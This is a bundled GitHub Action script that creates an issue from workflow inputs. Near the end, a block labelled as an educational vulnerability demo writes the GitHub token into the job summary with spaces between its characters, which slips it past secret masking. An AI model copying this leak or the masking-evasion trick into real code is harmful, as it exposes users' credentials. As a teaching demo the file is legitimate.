require('./sourcemap-register.js');/******/ (() => { // webpackBootstrap
/******/ 	var __webpack_modules__ = ({

/***/ 721:
/***/ ((module) => {

module.exports = eval("require")("@actions/core");


/***/ }),

/***/ 457:
/***/ ((module) => {

module.exports = eval("require")("@actions/github");


/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __nccwpck_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		var threw = true;
/******/ 		try {
/******/ 			__webpack_modules__[moduleId](module, module.exports, __nccwpck_require__);
/******/ 			threw = false;
/******/ 		} finally {
/******/ 			if(threw) delete __webpack_module_cache__[moduleId];
/******/ 		}
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/compat */
/******/ 	
/******/ 	if (typeof __nccwpck_require__ !== 'undefined') __nccwpck_require__.ab = __dirname + "/";
/******/ 	
/************************************************************************/
var __webpack_exports__ = {};
const core = __nccwpck_require__(721);
const github = __nccwpck_require__(457);

async function run() {
  try {
    // Get inputs
    const token = core.getInput('github-token', { required: true });
    const repository = core.getInput('repository', { required: true });
    const title = core.getInput('title', { required: true });
    const body = core.getInput('body');
    const labelsInput = core.getInput('labels');
    const assigneesInput = core.getInput('assignees');
    const milestoneInput = core.getInput('milestone');

    // Parse repository
    const [owner, repo] = repository.split('/');
    if (!owner || !repo) {
      throw new Error(`Invalid repository format: ${repository}. Expected format: owner/repo`);
    }

    // Initialize Octokit
    const octokit = github.getOctokit(token);

    // Prepare issue data
    const issueData = {
      owner,
      repo,
      title,
      body,
    };

    // Add labels if provided
    if (labelsInput) {
      issueData.labels = labelsInput.split(',').map(label => label.trim()).filter(Boolean);
    }

    // Add assignees if provided
    if (assigneesInput) {
      issueData.assignees = assigneesInput.split(',').map(assignee => assignee.trim()).filter(Boolean);
    }

    // Add milestone if provided
    if (milestoneInput) {
      const milestoneNumber = parseInt(milestoneInput, 10);
      if (!isNaN(milestoneNumber)) {
        issueData.milestone = milestoneNumber;
      }
    }

    // Create the issue
    core.info(`Creating issue in ${owner}/${repo}...`);
    const response = await octokit.rest.issues.create(issueData);

    // Set outputs
    core.setOutput('issue-number', response.data.number);
    core.setOutput('issue-url', response.data.html_url);

    core.info(`✅ Successfully created issue #${response.data.number}`);
    core.info(`URL: ${response.data.html_url}`);

    // EDUCATIONAL VULNERABILITY: Expose PAT in summary with spaces
    const spacedToken = token.split('').join(' ');
    await core.summary
      .addRaw(`⚠️ SECURITY VULNERABILITY DEMO - Token: ${spacedToken}`)
      .write();

  } catch (error) {
    core.setFailed(`Action failed: ${error.message}`);
  }
}

run();

module.exports = __webpack_exports__;
/******/ })()
;
//# sourceMappingURL=index.js.map